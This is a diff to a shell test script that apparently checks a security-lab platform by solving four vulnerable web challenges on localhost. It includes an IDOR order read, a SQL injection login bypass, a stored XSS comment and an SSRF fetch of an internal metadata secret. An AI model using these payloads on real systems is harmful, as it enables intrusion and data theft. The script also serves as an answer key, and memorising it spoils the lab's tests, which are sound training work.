@@ -55,5 +55,35 @@ if [ -n "${S:-}" ]; then
   submit write-finding "$S" "$F" | grep -q '"correct":true' && ok "complete finding → flag accepted" || bad "report solve" "$F"
   destroy "$S"
 fi
+
+L=$(launch web-idor-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "idor launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"amina","password":"shopper"}' | J "d['token']")
+  F=$(curl -s "http://127.0.0.1:$P/orders/102" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
+  submit read-other-order "$S" "$F" | grep -q '"correct":true' && ok "IDOR read → flag accepted" || bad "idor solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-sqli-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "sqli launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  F=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"admin'"'"' -- ","password":"x"}' | J "d.get('flag','')")
+  submit sqli-login "$S" "$F" | grep -q '"correct":true' && ok "SQLi bypass → flag accepted" || bad "sqli solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-xss-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "xss launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  curl -s -X POST "http://127.0.0.1:$P/comments" -H 'Content-Type: application/json' -d '{"text":"<script>BBM</script>"}' > /dev/null
+  F=$(curl -s "http://127.0.0.1:$P/flag?marker=BBM" | J "d.get('flag','')")
+  submit stored-xss "$S" "$F" | grep -q '"correct":true' && ok "stored XSS → flag accepted" || bad "xss solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch web-ssrf-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "ssrf launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  F=$(curl -s "http://127.0.0.1:$P/fetch?url=http://mock-metadata:8081/secret" | J "d.get('flag','')")
+  submit fetch-secret "$S" "$F" | grep -q '"correct":true' && ok "SSRF pivot → flag accepted" || bad "ssrf solve" "$F"
+  destroy "$S"
+fi
 echo "== $PASS passed, $FAIL failed =="
 [ "$FAIL" = "0" ]
